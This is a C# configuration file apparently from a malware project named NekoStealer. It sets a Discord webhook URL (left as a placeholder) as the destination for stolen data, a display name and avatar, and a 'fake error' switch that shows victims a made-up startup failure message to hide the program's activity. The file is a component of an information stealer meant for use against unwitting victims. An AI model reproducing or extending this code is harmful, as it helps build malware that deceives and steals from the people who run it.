using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NekoStealer
{
    class Config
    {
        public static string Url = "webhook url"; // Webhook Link
        public static string Username = "NekoStealer"; // Username
        public static string AvatarUrl = "https://cdn.discordapp.com/attachments/705906948922540044/868292483149348954/icon.gif"; // Avatar Link
        //Fake error
        public static bool FakeError = true;//Set true to show fake error
        public static string FakeErrorMessage = "Application failed to start. 0x09000b";
    }
}
